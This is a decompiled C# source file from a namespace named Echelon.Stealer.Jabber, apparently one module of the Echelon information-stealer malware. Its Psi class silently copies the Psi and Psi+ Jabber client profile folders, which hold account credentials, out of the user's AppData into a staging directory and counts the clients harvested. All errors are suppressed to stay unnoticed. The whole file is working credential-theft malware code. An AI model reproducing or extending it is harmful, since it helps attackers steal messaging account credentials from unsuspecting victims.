using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Jabber
{
	// Token: 0x0200001B RID: 27
	internal class Psi
	{
		// Token: 0x0600006D RID: 109 RVA: 0x0001A86C File Offset: 0x00018A6C
		public static void Start(string directorypath)
		{
			try
			{
				if (!Directory.Exists(Psi.dir))
				{
					return;
				}
				foreach (FileInfo fileInfo in new DirectoryInfo(Psi.dir).GetFiles())
				{
					Directory.CreateDirectory(directorypath + "\\Jabber\\Psi+\\profiles\\default\\");
					fileInfo.CopyTo(directorypath + "\\Jabber\\Psi+\\profiles\\default\\" + fileInfo.Name);
				}
				Startjabbers.count++;
			}
			catch
			{
			}
			try
			{
				if (Directory.Exists(Psi.dir2))
				{
					foreach (FileInfo fileInfo2 in new DirectoryInfo(Psi.dir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Jabber\\Psi\\profiles\\default\\");
						fileInfo2.CopyTo(directorypath + "\\Jabber\\Psi\\profiles\\default\\" + fileInfo2.Name);
					}
					Startjabbers.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000059 RID: 89
		public static string dir = Help.AppDate + "\\Psi+\\profiles\\default\\";

		// Token: 0x0400005A RID: 90
		public static string dir2 = Help.AppDate + "\\Psi\\profiles\\default\\";
	}
}
